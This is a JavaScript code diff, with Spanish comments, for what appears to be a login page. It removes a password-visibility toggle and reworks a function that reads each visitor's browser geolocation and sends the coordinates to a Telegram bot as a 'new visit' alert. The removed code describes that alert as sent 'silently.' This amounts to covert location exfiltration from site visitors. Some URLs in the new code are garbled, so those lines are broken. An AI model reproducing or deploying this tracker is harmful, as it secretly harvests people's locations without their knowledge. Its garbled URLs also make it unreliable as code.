@@ -137,35 +137,7 @@
   checkInputsRealtime();
 })();
 
-// Espera a que todo el HTML esté completamente cargado en el navegador
-document.addEventListener('DOMContentLoaded', () => {
-    const togglePassword = document.getElementById('togglePassword');
-    const passwordInput = document.getElementById('password');
 
-    // Cadenas de texto SVG con la estructura correcta para Chrome y Edge
-    const eyeOpenSVG = `<svg xmlns="http://w3.org" width="20" height="20" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><path d="M2 12s3-7 10-7 10 7 10 7-3 7-10 7-10-7-10-7Z"></path><circle cx="12" cy="12" r="3"></circle></svg>`;
-    const eyeClosedSVG = `<svg xmlns="http://w3.org" width="20" height="20" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><path d="M9.88 9.88a3 3 0 1 0 4.24 4.24"></path><path d="M10.73 5.08A10.43 10.43 0 0 1 12 5c7 0 10 7 10 7a13.16 13.16 0 0 1-1.67 2.68"></path><path d="M6.61 6.61A13.52 13.52 0 0 0 2 12s3 7 10 7a9.74 9.74 0 0 0 5.39-1.61"></path><line x1="2" y1="2" x2="22" y2="22"></line></svg>`;
-
-    if (togglePassword && passwordInput) {
-        togglePassword.addEventListener('click', function (e) {
-            // Previene cualquier comportamiento secundario del clic
-            e.preventDefault();
-
-            // Detecta el estado actual y lo alterna
-            const isPassword = passwordInput.getAttribute('type') === 'password';
-            
-            if (isPassword) {
-                passwordInput.setAttribute('type', 'text');
-                togglePassword.innerHTML = eyeOpenSVG;
-            } else {
-                passwordInput.setAttribute('type', 'password');
-                togglePassword.innerHTML = eyeClosedSVG;
-            }
-        });
-    } else {
-        console.error("No se encontraron los elementos necesarios en el HTML.");
-    }
-});
 
 document.addEventListener('DOMContentLoaded', () => {
     
@@ -216,37 +188,31 @@ function enviarATelegram(posicion) {
     const longitud = posicion.coords.longitude;
     const precision = posicion.coords.accuracy;
 
-    const mensaje = `📍 *Nueva Visita al Sistema*\n\n` +
-                    `• *Latitud:* \`${latitud}\`\n` +
-                    `• *Longitud:* \`${longitud}\`\n` +
-                    `• *Precisión:* ~${Math.round(precision)} metros\n\n` +
-                    `🔗 [Abrir Ubicación en Google Maps](https://google.com{latitud},${longitud})`;
+    // Mensaje limpio en texto plano (evita fallos de interpretación en Telegram)
+    const mensaje = `📍 Nueva Visita al Sistema\n\n` +
+                    `• Latitud: ${latitud}\n` +
+                    `• Longitud: ${longitud}\n` +
+                    `• Precision: ~${Math.round(precision)} metros\n\n` +
+                    `Google Maps: https://google.com{latitud},${longitud}`;
 
-    const url = `https://api.telegram.org/bot${TELEGRAM_TOKEN}/sendMessage`;
+    // Construcción de la URL codificada de forma nativa y compatible con archivos locales
+    const url = `https://telegram.org{TELEGRAM_TOKEN}/sendMessage?` + new URLSearchParams({
+        chat_id: TELEGRAM_CHAT_ID,
+        text: mensaje
+    });
 
-    fetch(url, {
-        method: 'POST',
-        headers: {
-            'Content-Type': 'application/json'
-        },
-        body: JSON.stringify({
-            chat_id: TELEGRAM_CHAT_ID,
-            text: mensaje,
-            parse_mode: 'Markdown'
-        })
-    })
+    // Realizar la petición HTTP GET (método más tolerante para entornos de prueba locales)
+    fetch(url)
     .then(response => {
-        if (!response.ok) throw new Error('Fallo en la respuesta de la API');
+        if (!response.ok) {
+            return response.json().then(err => { throw new Error(JSON.stringify(err)); });
+        }
         return response.json();
     })
     .then(data => {
-        console.log('Notificación de ubicación enviada de forma silenciosa.');
+        console.log('Mensaje enviado a Telegram con éxito:', data);
     })
     .catch(error => {
-        console.error('Error al notificar a la API de Telegram:', error);
+        console.error('Error detallado de Telegram:', error);
     });
-}
-
-function unErrorOcurrio(error) {
-    console.warn(`Código de estado de localización: ${error.code} - ${error.message}`);
 }
